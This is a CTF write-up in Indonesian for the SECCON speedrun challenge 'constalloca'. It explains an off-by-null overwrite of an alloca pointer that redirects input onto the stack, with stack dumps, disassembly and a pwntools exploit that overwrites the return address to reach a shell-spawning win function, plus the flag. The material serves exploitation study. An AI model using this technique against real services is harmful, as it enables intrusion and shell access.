# Speedrun_seccon —> constalloca

## Description:

Calling alloca with a constant argument is secure. Wait, what is alloca for?

allocaの引数に定数を渡せば安全ですね。いや、何のためのallocaだよ。

## Problem:

Program menambahkan `\0` atau `null` pada akhir inputan sehingga terjadi celah `off-by-null` dimana kita overwrite `1 byte null` ke dalam stack.

```python
void readn(char *ptr, int size) {
  /* Read data up to `size` bytes into `ptr` */
  for (int i = 0; i != size; i++, ptr++) {
    read(0, ptr, 1);
    if (*ptr == '\n') break;
  }
  *ptr = '\0'; // terminate by null
}

int main() {
  char title[0x18];
  char *content = alloca(0x80);

  /* Input title */
  printf("title: ");
  readn(title, 0x18);

  /* Input content */
  printf("data: ");
  readn(content, 0x80);

  return 0;
}
```

Tujuan akhirnya masih sama yaitu memanggil fungsi `win`

```python
void win() {
  /* Call me :pleading_face: */
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}
```

## Solution:

Pertama kita liat perbedaan stack layout saat inputan biasa dan inputan ketika `off-by-null`

```python
 /* Input Biasa */

0152| 0x7fffffffddb0 ('A' <repeats 23 times>)
0160| 0x7fffffffddb8 ('A' <repeats 15 times>)
0168| 0x7fffffffddc0 --> 0x41414141414141 ('AAAAAAA')
0176| 0x7fffffffddc8 --> 0x7fffffffdd20 --> 0x0  // Perbedaan ada disini
0184| 0x7fffffffddd0 --> 0x0 
0192| 0x7fffffffddd8 --> 0x7ffff7de30b3 (<__libc_start_main+243>:	mov    edi,eax)

/* Input Off-by-null */

0152| 0x7fffffffddb0 ('A' <repeats 24 times>)
0160| 0x7fffffffddb8 ('A' <repeats 16 times>)
0168| 0x7fffffffddc0 ("AAAAAAAA")
0176| 0x7fffffffddc8 --> 0x7fffffffdd00 --> 0x401350 (<__libc_csu_init>:	endbr64) // Perbedaan ada disini
0184| 0x7fffffffddd0 --> 0x0 
0192| 0x7fffffffddd8 --> 0x7ffff7de30b3 (<__libc_start_main+243>:	mov    edi,eax)
```

Bisa kita liat ada perbedaan dimana kita bisa overwrite `null byte` sehingga mengubah alamat  pointer setelahnya. 

Ternyata jika kita lihat alamat tersebut nanti akan digunakan untuk menampung variabel `content` yang akan diinputkan setelahnya.

```bash
0x00000000004012c7 <+156>:	call   0x401070 <printf@plt>
0x00000000004012cc <+161>:	lea    rax,[rbp-0x20]
0x00000000004012d0 <+165>:	mov    esi,0x18
0x00000000004012d5 <+170>:	mov    rdi,rax
0x00000000004012d8 <+173>:	call   0x4011d0 <readn>
0x00000000004012dd <+178>:	lea    rdi,[rip+0xd30]        # 0x402014
0x00000000004012e4 <+185>:	mov    eax,0x0
0x00000000004012e9 <+190>:	call   0x401070 <printf@plt>
0x00000000004012ee <+195>:	mov    rax,QWORD PTR [rbp-0x8] // rbp-0x8 itu berisi alamat yang ter-overwrite 1 byte
0x00000000004012f2 <+199>:	mov    esi,0x80
0x00000000004012f7 <+204>:	mov    rdi,rax
0x00000000004012fa <+207>:	call   0x4011d0 <readn>
0x00000000004012ff <+212>:	mov    eax,0x0
0x0000000000401304 <+217>:	leave  
0x0000000000401305 <+218>:	ret
```

Sehingga sekarang inputan variabel `content` akan tersimpan pada alamat `0x7fffffffdd00` bukan yang seharusnya yaitu `0x7fffffffdd20` sehingga kita bisa melakukan overwrite return address yang tersimpan pada alamat `0x7fffffffdd18` menjadi alamat fungsi `win`

```python
from pwn import *

LOCAL = False

if LOCAL : r = process("./chall")
else:  r = remote("133.242.227.104",9993)

elf = ELF("./chall",checksec=False)

win = p64(elf.symbols["win"])

r.sendafter(": ",b"A"*0x18)
r.sendlineafter(": ",win*4) // Disini karena males bikin inputan dummy bisa aja langsung kasih alamat win*4, atau bisa juga 'A'*24 + win
r.interactive()
```

- Note: Ngga tau kenapa payload yang aku pake kadang mau jalan (dapet shell) kadang ngga, mungkin ada yang salah

## Flag:

`RTACON{0ff-by-nu11_Tr4g1c_:doge:}`